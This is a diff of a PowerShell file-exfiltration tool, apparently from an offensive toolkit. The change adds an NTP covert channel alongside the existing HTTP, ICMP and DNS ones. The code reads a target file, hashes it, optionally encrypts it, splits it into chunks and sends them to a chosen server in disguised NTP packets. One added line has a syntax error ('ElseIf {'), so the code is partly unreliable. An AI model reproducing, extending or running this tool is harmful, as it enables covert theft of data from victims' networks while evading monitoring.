@@ -1,11 +1,10 @@
 function Invoke-Exfiltration {
     param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep)
-    $bytes = [System.IO.File]::ReadAllBytes($file)
+    $data = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
+    $hash = [System.BitConverter]::ToString($md5.ComputeHash($data))
     $hash = $hash -replace '-','';
     
-    $data = [System.IO.File]::ReadAllBytes($file);
     If ($key) {
         $data = AES $data 
     }
@@ -14,24 +13,38 @@ function Invoke-Exfiltration {
     $string = $string -replace '-','';
     $filename = Split-Path $file -leaf
     $len = $string.Length;
-    #$split = 300
+
     If ($type -eq 'dns') {
-     $split = 66 - $len.Length - $dns.Length;
+	#$split = 66 - $len.Length - $dns.Length;
+	$split = 50
+    }
+    ElseIf {$type -eq 'ntp') {
+	$split = 20
     }
     Else {
-    $split = Get-Random -minimum 150 -maximum 500;
+	$split = Get-Random -minimum 150 -maximum 500;
     }
 
     $id = 0
-    $repeat=[Math]::Floor($len/$split);
+    If ($type -eq 'ntp') {
+	$repeat=[Math]::Ceiling($len/$split);
+    }
+    Else {
+	$repeat=[Math]::Floor($len/$split);
+    }
+
     $remainder=$len%$split;
     $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
-    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
+    
+    If ($type -eq 'ntp') {
+	$register1 = 'REG-' + $jobid + '|!|' + $filename + '|!|REGISTER|!|'
+        $register2 = 'REG-' + $hash
+    }
+    Else {
+	$data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
+    }
 
-
-    # determine exfil type and send data;
-	
-
+    # Determine exfiltration type and send data
     If ($type -eq 'ALL') {
       
         $IE = new-object -com internetexplorer.application;
@@ -105,7 +118,7 @@ function Invoke-Exfiltration {
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-HTTPRequest $data $IE
     }
-    Elseif ($type -eq 'ICMP') {
+    ElseIf ($type -eq 'ICMP') {
         $q = Send-ICMPPacket $data
         for($i=0; $i-lt($repeat); $i++){
             $str = $string.Substring($i * $Split, $Split);
@@ -120,6 +133,25 @@ function Invoke-Exfiltration {
         }
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-ICMPPacket $data
+    }
+    ElseIf ($type -eq 'NTP') {
+        $q = Send-NTPPacket $register1
+        $q = Send-NTPPacket $register2
+        for($i=0; $i-lt($repeat-1); $i++){
+            $str = $string.Substring($i * $Split, $Split);
+            $data = $jobid + '|!|' + $i + '|!|' + 'N' + '|!|' + $str
+            $q = Send-NTPPacket $data
+        };
+        if($remainder){
+            $str = $string.Substring($len-$remainder);
+            $i = $i +1
+            $data = $jobid + '|!|' + $i + '|!|' + 'N' + '|!|' + $str
+            $q = Send-NTPPacket $data
+        };
+    
+        $i = $i + 1
+        $data = $jobid + '|!|' + $i + '|!|DONE'
+        $q = Send-NTPPacket $data
     }
 }
 
@@ -172,6 +204,47 @@ function Send-DNSRequest {
         $sleep = Get-Random -minimum 0 -maximum 8; 
     }
     Start-Sleep -s $sleep;
+}
+
+function Send-NTPPacket {
+    param ([string] $data)
+    [Byte[]]$NtpData = ,0 * 48
+    $NtpData[0] = 0x1B    # NTP Request header in first byte
+    $NtpData[47] = 0x1B
+
+    for ($i=0;$i-lt 46; $i++) {
+        $NtpData[$i+1] = $data[$i]
+    }
+    #$Server = $server
+
+    $Socket = New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,
+                                            [Net.Sockets.SocketType]::Dgram,
+                                            [Net.Sockets.ProtocolType]::Udp)
+    $Socket.SendTimeOut = 2000  # ms
+    $Socket.ReceiveTimeOut = 2000   # ms
+
+    Try {
+        $Socket.Connect($server,123)
+    }
+    Catch {
+        Write-Error "Failed to connect to server $server"
+        Throw 
+    }
+
+    $t1 = Get-Date    # t1, Start time of transaction... 
+    
+    Try {
+        [Void]$Socket.Send($NtpData)
+    }
+    Catch {
+        Write-Error "Failed to communicate with server $server"
+        Throw
+    }
+
+    $t4 = Get-Date    # End of NTP transaction time
+
+    $Socket.Shutdown("Both") 
+    $Socket.Close()
 }
   
 function Base64 {
